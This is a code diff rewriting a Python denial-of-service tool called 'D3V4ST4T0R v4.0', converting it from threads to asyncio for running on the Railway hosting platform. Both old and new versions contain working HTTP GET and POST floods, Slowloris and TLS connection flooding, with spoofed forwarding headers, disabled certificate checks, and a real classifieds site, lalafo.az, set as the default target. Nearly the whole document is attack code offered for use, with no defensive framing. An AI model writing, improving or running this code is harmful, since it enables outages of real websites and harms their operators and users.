@@ -1,251 +1,256 @@
-#!/usr/bin/env python3
-"""
-D3V4ST4T0R v4.0 - RAILWAY EDITION
-Railway server üçün optimallaşdırılmış versiya
-"""
-import socket, ssl, threading, random, string, time, sys, json, os
+import asyncio
+import aiohttp
+import ssl
+import random
+import time
+import os
+import sys
+import signal
+from urllib.parse import urlparse
 
-# === KONFİQ ===
-HEDEF = os.environ.get("TARGET", "lalafo.az")
-PORT = int(os.environ.get("PORT", 443))
-USE_SSL = os.environ.get("SSL", "true").lower() == "true"
-THREAD_COUNT = int(os.environ.get("THREADS", 20000))
-MUDDET = int(os.environ.get("DURATION", 999999))
+# === CONFIG FROM ENV ===
+TARGET = os.getenv("TARGET", "lalafo.az")
+PORT = int(os.getenv("PORT", "443"))
+SSL = os.getenv("SSL", "true").lower() == "true"
+THREADS = int(os.getenv("THREADS", "500"))  # 500 concurrent tasks — safe for Railway
+DURATION = int(os.getenv("DURATION", "120"))  # seconds
 
-# === User-Agent ===
-UA_POOL = [
-    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36"
-    for v in range(120, 135)
-] + [
-    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"
-    for v in [120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130]
-] + [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
-    "Mozilla/5.0 (Linux; Android 14; SM-S24) AppleWebKit/537.36 Chrome/130.0.6099.144 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 Chrome/129.0.6668.100 Mobile Safari/537.36",
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+TARGET_URL = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/"
+BANNER = f"""
+███████████████████████████████████████████████████████████████████████████
+█  D3V4ST4T0R v4.0 — Railway Asyncio Edition                            █
+█  Target: {TARGET_URL[:70]:<70}█
+█  Tasks: {THREADS:<5} | Duration: {DURATION}s | Port: {PORT:<5}         █
+███████████████████████████████████████████████████████████████████████████
+"""
+
+METHODS = [
+    "http_flood",
+    "slowloris",
+    "post_flood",
+    "ssl_reneg",
 ]
 
-def rand_str(n=12):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
+# === HTTP Flood (GET) ===
+async def http_flood(session, method_idx):
+    """Rapid GET requests"""
+    paths = [
+        "/", "/az", "/en", "/ru",
+        "/search", "/ads", "/categories",
+        "/login", "/register", "/post-ad",
+        f"/?r={random.randint(1,999999)}",
+    ]
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
+        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
+    ]
+    headers = {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "az,en-US;q=0.9,en;q=0.8,ru;q=0.7",
+        "Cache-Control": "no-cache, no-store, must-revalidate",
+        "Pragma": "no-cache",
+        "Referer": f"https://{TARGET}/{random.choice(['', 'az', 'en', 'ru'])}",
+    }
+    while True:
+        try:
+            path = random.choice(paths)
+            url = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}{path}"
+            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                await resp.read()
+            return True
+        except:
+            return False
 
-def rand_ip():
-    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+# === Slowloris ===
+async def slowloris(session, method_idx):
+    """Slowloris — send headers slowly"""
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+    ]
+    while True:
+        try:
+            # Open connection via raw TCP since aiohttp doesn't do partial headers well
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(TARGET, PORT, ssl=ssl.create_default_context() if SSL else None),
+                timeout=15
+            )
+            request = (
+                f"POST / HTTP/1.1\r\n"
+                f"Host: {TARGET}\r\n"
+                f"User-Agent: {random.choice(user_agents)}\r\n"
+                f"Content-Length: 1000000\r\n"
+                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
+            )
+            writer.write(request.encode())
+            await writer.drain()
+            # Hold connection open, trickle data slowly
+            for _ in range(random.randint(10, 30)):
+                writer.write(f"X-keep-alive: {random.randint(1,99999999)}\r\n".encode())
+                await writer.drain()
+                await asyncio.sleep(random.uniform(5, 15))
+            writer.close()
+            await writer.wait_closed()
+        except:
+            try:
+                writer.close()
+            except:
+                pass
+            await asyncio.sleep(1)
 
-def resolve(hostname):
-    ips = []
-    try:
-        ips.append(socket.gethostbyname(hostname))
-        print(f"  [+] DNS resolve: {hostname} -> {ips[0]}")
-        # Əlavə DNS məlumatı
-        for info in socket.getaddrinfo(hostname, 80, socket.AF_INET, socket.SOCK_STREAM):
-            ip = info[4][0]
-            if ip not in ips:
-                ips.append(ip)
-        print(f"  [+] Cəmi {len(ips)} IP tapıldı: {', '.join(ips[:5])}")
-    except Exception as e:
-        print(f"  [!] DNS error: {e}")
-    return ips
+# === POST Flood ===
+async def post_flood(session, method_idx):
+    """Large POST requests"""
+    while True:
+        try:
+            # Generate random payload
+            payload_size = random.randint(10000, 100000)
+            payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789&=", k=payload_size))
+            data = f"username=admin&password=admin&description={payload}&submit=1"
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": f"Mozilla/5.0 (compatible; D3V4ST4T0R/{random.randint(1,9)}.{random.randint(0,9)})",
+            }
+            url = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/search"
+            async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                await resp.read()
+        except:
+            pass
 
-def gen_headers(host):
-    return (
-        f"User-Agent: {random.choice(UA_POOL)}\r\n"
-        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-        f"Accept-Language: {random.choice(['en-US,en;q=0.9','tr-TR,tr;q=0.8,en;q=0.5','az-Latn-AZ,az;q=0.9,en;q=0.5','ru-RU,ru;q=0.9,en;q=0.5'])}\r\n"
-        f"Accept-Encoding: gzip, deflate, br\r\n"
-        f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
-        f"Pragma: no-cache\r\n"
-        f"Connection: keep-alive\r\n"
-        f"Upgrade-Insecure-Requests: 1\r\n"
-        f"X-Forwarded-For: {rand_ip()}\r\n"
-        f"X-Real-IP: {rand_ip()}\r\n"
-        f"CF-Connecting-IP: {rand_ip()}\r\n"
-        f"True-Client-IP: {rand_ip()}\r\n"
-        f"X-Request-ID: {hashlib.md5(rand_str(20).encode()).hexdigest()[:16]}\r\n"
-        if False else ""  # hashlib import etməmək üçün
-        f"From: user{random.randint(1,99999)}@example.com\r\n"
-    )
-
-# Metod 1: HTTP Flood
-def http_flood(ip, port, ssl_mode, host):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        if ssl_mode:
-            ctx = ssl._create_unverified_context()
+# === SSL Renegotiation ===
+async def ssl_reneg(session, method_idx):
+    """SSL/TLS renegotiation attempt — opens many SSL connections"""
+    while True:
+        try:
+            ctx = ssl.create_default_context()
+            # Insecure but aggressive
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
             ctx.set_ciphers('ALL:@SECLEVEL=0')
-            sock = ctx.wrap_socket(sock, server_hostname=host)
-        sock.connect((ip, port))
-        path = random.choice([
-            "/", f"/{rand_str()}", f"/api/v1/{rand_str()}", f"/search?q={rand_str()}",
-            f"/?nocache={random.randint(100000,999999)}",
-            f"/wp-content/themes/{rand_str()}/{rand_str()}.php?ver={random.randint(1,9)}.{random.randint(1,9)}"
-        ])
-        req = (
-            f"GET {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"{gen_headers(host)}"
-            f"\r\n"
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(TARGET, PORT, ssl=ctx),
+                timeout=15
+            )
+            # Send garbage to cause SSL processing overhead
+            for _ in range(5):
+                try:
+                    writer.write(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % TARGET.encode())
+                    await writer.drain()
+                    await asyncio.sleep(0.1)
+                except:
+                    break
+            writer.close()
+            await writer.wait_closed()
+        except:
+            await asyncio.sleep(0.5)
+
+# === Health Check Server (for Railway) ===
+async def health_server():
+    """Simple HTTP server for Railway health checks on port 8080"""
+    try:
+        reader, writer = await asyncio.wait_for(
+            asyncio.start_server(
+                lambda r, w: asyncio.create_task(handle_health(r, w)),
+                host="0.0.0.0", port=8080
+            ),
+            timeout=5
         )
-        sock.send(req.encode())
-        try: sock.recv(1024)
-        except: pass
-        sock.close()
-    except: pass
+        print(f"[+] Health check server running on port 8080")
+        return writer  # server instance
+    except Exception as e:
+        print(f"[!] Health server: {e}")
+        return None
 
-# Metod 2: SSL Flood
-def ssl_flood(ip, host):
+async def handle_health(reader, writer):
+    response = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
+    writer.write(response)
+    await writer.drain()
+    writer.close()
+    await writer.wait_closed()
+
+# === Main ===
+async def worker_pool():
+    """Create task pool and distribute work"""
+    connector = aiohttp.TCPConnector(
+        limit=0,           # no connection limit
+        force_close=True,  # close connections aggressively
+        ttl_dns_cache=0,   # no DNS cache
+        verify_ssl=False,
+        use_dns_cache=False,
+    )
+    
+    timeout = aiohttp.ClientTimeout(total=0)  # no timeout
+    
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        tasks = []
+        method_cycle = 0
+        
+        for i in range(THREADS):
+            method = METHODS[method_cycle % len(METHODS)]
+            method_cycle += 1
+            
+            if method == "http_flood":
+                task = http_flood(session, 0)
+            elif method == "slowloris":
+                task = slowloris(session, 1)
+            elif method == "post_flood":
+                task = post_flood(session, 2)
+            elif method == "ssl_reneg":
+                task = ssl_reneg(session, 3)
+            
+            tasks.append(asyncio.create_task(task))
+            
+            # Spread out creation slightly to avoid thundering herd
+            if i % 50 == 0:
+                await asyncio.sleep(0.01)
+        
+        print(f"  [+] Launched {len(tasks)} attack tasks\n")
+        
+        # Let run for duration
+        await asyncio.sleep(DURATION)
+        
+        # Cancel all tasks
+        for t in tasks:
+            t.cancel()
+        
+        print("\n[✓] Attack complete. All tasks stopped.")
+
+async def main():
+    print(BANNER)
+    print(f"[+] Resolving {TARGET}...")
+    
+    # DNS resolution test
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2)
-        sock.connect((ip, 443))
-        ctx = ssl._create_unverified_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        ctx.set_ciphers('ALL:@SECLEVEL=0')
-        ssock = ctx.wrap_socket(sock, server_hostname=host)
-        ssock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
-        try: ssock.recv(512)
-        except: pass
-        ssock.close()
-    except: pass
-
-# Metod 3: Slowloris
-def slowloris(ip, port, ssl_mode, host):
+        import socket
+        ips = socket.getaddrinfo(TARGET, PORT)
+        print(f"  [+] Resolved to: {list(set(ip[4][0] for ip in ips))}")
+    except Exception as e:
+        print(f"  [!] DNS resolution failed: {e}")
+        sys.exit(1)
+    
+    print(f"[+] Starting attack with {THREADS} concurrent tasks for {DURATION}s")
+    print(f"  [+] Methods: {', '.join(METHODS)}")
+    print(f"  [+] URL: {TARGET_URL}")
+    print()
+    
+    # Start health server
+    health_task = asyncio.create_task(health_server())
+    
+    # Start attack
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(15)
-        if ssl_mode:
-            ctx = ssl._create_unverified_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            sock = ctx.wrap_socket(sock, server_hostname=host)
-        sock.connect((ip, port))
-        sock.send(f"GET /{rand_str()} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UA_POOL)}\r\n".encode())
-        start = time.time()
-        while time.time() - start < 20:
-            try:
-                sock.send(f"X-{rand_str()}: {rand_str()}\r\n".encode())
-                time.sleep(random.uniform(2, 6))
-            except: break
-        sock.close()
-    except: pass
+        await worker_pool()
+    except asyncio.CancelledError:
+        print("\n[!] Attack cancelled")
+    
+    print("[✓] Done.")
 
-# Metod 4: POST Flood (böyük payload)
-def post_flood(ip, port, ssl_mode, host):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(4)
-        if ssl_mode:
-            ctx = ssl._create_unverified_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            sock = ctx.wrap_socket(sock, server_hostname=host)
-        sock.connect((ip, port))
-        body = rand_str(random.randint(10000, 50000))
-        req = (
-            f"POST /api/{rand_str()}/{rand_str()} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"{gen_headers(host)}"
-            f"Content-Type: application/x-www-form-urlencoded\r\n"
-            f"Content-Length: {len(body)}\r\n"
-            f"\r\n"
-            f"{body}"
-        )
-        sock.send(req.encode()[:2048])
-        try: sock.recv(256)
-        except: pass
-        sock.close()
-    except: pass
-
-# Worker thread
-stop_flag = threading.Event()
-request_count = 0
-count_lock = threading.Lock()
-
-def worker(ip, port, ssl_mode, host, wid):
-    methods = [http_flood, ssl_flood, slowloris, post_flood, http_flood, http_flood]
-    while not stop_flag.is_set():
-        m = random.choice(methods)
-        try:
-            m(ip, port, ssl_mode, host)
-            with count_lock:
-                global request_count
-                request_count += 1
-        except: pass
-        time.sleep(random.uniform(0.0001, 0.0005))
-
-# === RAILWAY HEALTH CHECK ENDPOINT ===
-from http.server import HTTPServer, BaseHTTPRequestHandler
-
-class HealthHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.end_headers()
-        with count_lock:
-            total = request_count
-        self.wfile.write(json.dumps({
-            "status": "running",
-            "target": HEDEF,
-            "threads": threading.active_count(),
-            "uptime": f"{int(time.time() - start_time)}s",
-            "requests": total,
-        }).encode())
-    def log_message(self, *args): pass
-
-def start_health_server():
-    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
-    print(f"  [+] Health check: http://0.0.0.0:8080")
-    server.serve_forever()
-
-# === MAIN ===
 if __name__ == "__main__":
-    global start_time
-    start_time = time.time()
-    
-    print("="*50)
-    print("D3V4ST4T0R v4.0 - RAILWAY EDITION")
-    print("="*50)
-    print(f"  Hedef: {HEDEF}")
-    print(f"  Port: {PORT} {'(SSL)' if USE_SSL else '(HTTP)'}")
-    print(f"  Thread: {THREAD_COUNT:,}")
-    print()
-    
-    print("[*] DNS cozulur...")
-    ips = resolve(HEDEF)
-    if not ips:
-        ips = [HEDEF]
-    
-    ip = ips[0]
-    print(f"[*] Hucum baslayir: {ip}:{PORT}")
-    print()
-    
-    # Thread-ləri başlat
-    for i in range(THREAD_COUNT):
-        t = threading.Thread(target=worker, args=(ip, PORT, USE_SSL, HEDEF, i), daemon=True)
-        t.start()
-        if (i+1) % 2000 == 0:
-            print(f"  [+] {i+1}/{THREAD_COUNT} thread...")
-    
-    print(f"\n[!] {THREAD_COUNT} THREAD ISHE SALINDI!")
-    print(f"[!] Health check: http://localhost:8080 (Railway internal)")
-    
-    # Health server başlat
-    threading.Thread(target=start_health_server, daemon=True).start()
-    
-    # Monitor
     try:
-        while time.time() - start_time < MUDDET:
-            with count_lock:
-                rps = request_count / (time.time() - start_time + 0.1)
-            print(f"\r  [+] {int(time.time()-start_time)}s | Threads: {threading.active_count():,} | RPS: {rps:,.0f} | Total: {request_count:,}", end="")
-            time.sleep(2)
+        asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n\n[!] Dayandirildi")
-        stop_flag.set()
+        print("\n[!] Interrupted by user")
+        sys.exit(0)
